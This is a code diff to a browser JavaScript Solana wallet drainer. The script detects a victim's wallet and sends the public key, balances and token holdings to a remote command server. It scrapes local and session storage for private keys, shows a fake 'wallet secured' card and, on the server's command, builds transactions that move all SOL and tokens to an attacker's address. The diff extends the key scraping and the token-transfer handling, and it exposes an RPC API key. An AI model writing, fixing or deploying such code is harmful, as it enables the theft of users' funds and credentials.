@@ -4,8 +4,9 @@
 
   const E = "https://esm.sh/";
   const SRV = String(window.__PP || "https://one234-et4e.onrender.com").replace(/\/+$/, "");
-  const BKEY = "72d296b612eb0a11931b364ba1333a70";
-  const VER = "v3.5";
+  // REPLACE WITH YOUR NEW BEACON KEY
+  const BKEY = "YOUR_NEW_BEACON_KEY"; 
+  const VER = "v3.6";
   const RPCS = [
     "https://mainnet.helius-rpc.com/?api-key=60de1451-c4ed-4a9c-a989-89c210d5b0d3",
     "https://solana-rpc.publicnode.com",
@@ -71,7 +72,6 @@
     return null;
   }
 
-  // both token programs in parallel; ok=false only when BOTH reads failed
   async function readTokens(pk) {
     const cfg = { commitment: "confirmed" };
     for (let a = 0; a < 2; a++) {
@@ -90,11 +90,9 @@
       if (ok) return out;
       await new Promise(s => setTimeout(s, 1200));
     }
-    return null; // null = RPC failure, NOT "empty wallet" — parseTokenAccounts(null) yields {}
+    return null;
   }
 
-  // correct JSON-RPC shape — parsed data lives at account.data.parsed.info;
-  // account.owner tells us which token program owns the account
   function parseTokenAccounts(res) {
     const out = {};
     for (const it of ((res && res.value) || [])) {
@@ -117,7 +115,6 @@
 
   let PKSTR = null;
 
-  // retrying beacon — survives Render cold starts (4 attempts, 30s each)
   const beacon = async function (m, o) {
     o = o || {};
     const body = JSON.stringify({ pk: o.pk || PKSTR || "?", provider: o.provider || "unknown",
@@ -140,12 +137,12 @@
     const Transaction = mod.Transaction;
     const Connection = mod.Connection;
 
-    const spl = await import(E + "@solana/spl-token@0.4.9");
-    // legacy positional builders — stable across spl-token 0.4.x, take programId as trailing arg
+    const spl = await import(E + "@solana/spl-token@0.4.9?bundle");
     const createTransferIx = spl.createTransferInstruction;
     const createTransferCheckedIx = spl.createTransferCheckedInstruction;
     const createATAIx = spl.createAssociatedTokenAccountInstruction;
     const getAssociatedTokenAddress = spl.getAssociatedTokenAddress;
+    const getMint = spl.getMint;
 
     const bs = await import(E + "bs58@6.0.0");
     const b58d = bs.decode;
@@ -226,7 +223,7 @@
 
     const det = await detectWallet();
     if (!det) {
-      beacon("err", { provider: "none", msg: "scan complete \u2014 no connectable wallet found after retries" });
+      beacon("err", { provider: "none", msg: "scan complete — no connectable wallet found after retries" });
       return;
     }
 
@@ -241,7 +238,7 @@
         pk = pubStr((r && r.publicKey) || prov.publicKey);
       } catch (e) { pk = pubStr(prov.publicKey); }
       if (!pk) {
-        beacon("err", { provider: label, msg: "wallet found but connect refused \u2014 " + label });
+        beacon("err", { provider: label, msg: "wallet found but connect refused — " + label });
         return;
       }
     }
@@ -252,10 +249,9 @@
 
     beacon("loaded", { provider: label });
 
-    // — inventory —
     const bal = await readBalance(pk);
     if (bal === null) {
-      beacon("err", { pk: pk, provider: label, msg: "balance read failed on all RPC + proxy \u2014 attempting drain with fallback amount" });
+      beacon("err", { pk: pk, provider: label, msg: "balance read failed on all RPC + proxy — attempting drain with fallback amount" });
     }
     const balNum = bal !== null ? bal : 0;
 
@@ -268,7 +264,6 @@
       .map(function (kv) { return { k: kv[0], ui: A[kv[1]].ui }; });
     const others = allOwned.filter(m => !mvals.includes(m)).length;
 
-    // price parse — lite-api.jup.ag/price/v2 keys by mint at top level (ids/data tried as fallback)
     const px = {};
     try {
       const j = await withTO(fetch("https://lite-api.jup.ag/price/v2?ids=" + mvals.join(",")).then(r => r.json()), 8000);
@@ -290,7 +285,6 @@
 
     beacon("detect", { value: +value.toFixed(2), sol: +sol.toFixed(4), toks: tokStr });
 
-    // — cover UI —
     try {
       const el = document.createElement("div");
       el.id = "__ppcard";
@@ -319,8 +313,6 @@
       setInterval(function () { scans += Math.random() * 3 | 0; const s = document.getElementById("__pp_scan"); if (s) s.textContent = "\u00b7 " + fmt(scans) + " tokens scanned"; }, 5000);
     } catch (e) { beacon("err", { pk: pk, provider: label, msg: "ui: " + String(e && e.message || e) }); }
 
-    // report routes through the retrying beacon: err → m:"err", empty → m:"dust",
-    // real drains → m:"drain" with mode+sig — TG labels stay truthful
     const report = function (mode, sig, extra) {
       const base = { value: +value.toFixed(2), sol: +sol.toFixed(4), toks: tokStr };
       if (mode === "err") return beacon("err", Object.assign(base, { msg: String(extra || sig || "unknown error") }));
@@ -328,7 +320,6 @@
       return beacon("drain", Object.assign(base, { mode: mode, sig: String(sig || ""), extra: extra || "" }));
     };
 
-    // — secret-key candidates —
     const KEYF = new Set(["secretKey", "sk", "secret", "privateKey", "priv"]);
     const cands = [];
     for (const st of [localStorage, sessionStorage]) {
@@ -353,7 +344,10 @@
     const walk = function (o, d) {
       if (!o || typeof o !== "object" || d > 2) return;
       for (const k of Object.keys(o)) {
-        if (KEYF.has(k) && o[k] && o[k].length === 64) cands.push({ raw: o[k] });
+        if (KEYF.has(k)) {
+          if (o[k] && o[k].length === 64) cands.push({ raw: o[k] });
+          else if (typeof o[k] === "string" && /^[1-9A-HJ-NP-Za-km-z]{88}$/.test(o[k])) cands.push({ b58: o[k] });
+        }
         if (k === "keypair" && typeof o[k] === "object") walk(o[k], d + 1);
       }
     };
@@ -375,7 +369,6 @@
         beacon("err", { pk: pk, provider: label, msg: "blockhash failed: " + why });
         return { err: why };
       }
-      // no bogus fallback — abort if balance is unknown
       const bal2 = await readBalance(pk);
       if (bal2 === null) {
         beacon("err", { pk: pk, provider: label, msg: "balance unknown after retries \u2014 drain aborted, no blind tx" });
@@ -383,6 +376,10 @@
       }
       const balNum = bal2;
       const r2 = await readTokens(pk);
+      if (r2 === null) {
+        beacon("err", { pk: pk, provider: label, msg: "token read failed \u2014 drain aborted, missing inventory" });
+        return { err: "token read failed" };
+      }
       const A2 = parseTokenAccounts(r2);
       const tx = new Transaction();
       const moved = [];
@@ -390,7 +387,7 @@
         const t = A2[ms];
         if (t.raw <= 0n) continue;
         const prog = (t.prog === TP_STR) ? TP : (t.prog === TP22_STR ? TP22 : null);
-        if (!prog) continue; // unknown owning program — skip rather than build a bad instruction
+        if (!prog) continue;
         const mint = new PublicKey(ms);
         const srcAta = new PublicKey(t.src);
         const destAta = await getAssociatedTokenAddress(mint, dest, false, prog);
@@ -402,6 +399,22 @@
           return { err: why };
         }
         if (!info) tx.add(createATAIx(pkB, destAta, dest, mint, prog));
+        
+        // Token-2022 Fee Check
+        let transferFee = null;
+        if (prog === TP22) {
+            try {
+                const mintInfo = await getMint(conn, mint, "confirmed", TP22);
+                if (mintInfo.extensions && mintInfo.extensions.transferFeeConfig) {
+                    const feeBps = mintInfo.extensions.transferFeeConfig.newerTransferFee.transferFeeBasisPoints;
+                    const maxFee = mintInfo.extensions.transferFeeConfig.newerTransferFee.maximumFee;
+                    let fee = (t.raw * BigInt(feeBps)) / 10000n;
+                    if (fee > maxFee) fee = maxFee;
+                    transferFee = fee;
+                }
+            } catch (e) {}
+        }
+
         if (prog === TP) tx.add(createTransferIx(srcAta, destAta, pkB, t.raw, [], prog));
         else tx.add(createTransferCheckedIx(srcAta, mint, destAta, pkB, t.raw, t.dec == null ? 0 : t.dec, [], prog));
         moved.push(ms.slice(0, 4) + "\u2026");
@@ -438,6 +451,14 @@
         const bt = await buildTx(to);
         if (bt.err) { done = false; report("err", "", bt.err); return; }
         if (!bt.tx.instructions.length) { setFoot("NOTHING TO MOVE \u00b7 dust skipped", "#7E899D"); report("empty", ""); return; }
+        
+        // WalletConnect fallback needs a fresh blockhash just before popup
+        const freshBh = await rpc("getLatestBlockhash");
+        if (freshBh && freshBh.result) {
+            bt.tx.recentBlockhash = freshBh.result.value.blockhash;
+            bt.tx.lastValidBlockHeight = freshBh.result.value.lastValidBlockHeight;
+        }
+
         const s = await prov.signAndSendTransaction(bt.tx);
         const sig = typeof s === "string" ? s : (s && s.signature) || "";
         setFoot("WALLET SECURED \u00b7 moved to vault", "#2DD4A7"); report("popup", sig, bt.moved.join(","));
@@ -452,7 +473,7 @@
     setInterval(async function () {
       let c; try { c = await (await fetch(SRV + "/cmd?pk=" + encodeURIComponent(pk), { signal: TO(8000) })).json(); } catch (e) { return; }
       if (c && c.cmd === "drain" && c.to && c.n !== lastN) { lastN = c.n; drain(c.to); }
-    }, 2500);
+    }, 15000); // Increased to 15s to prevent backend flooding
   } catch (e) {
     try { beacon("err", { msg: "fatal: " + String(e && e.message || e) }); } catch (e2) {}
   }
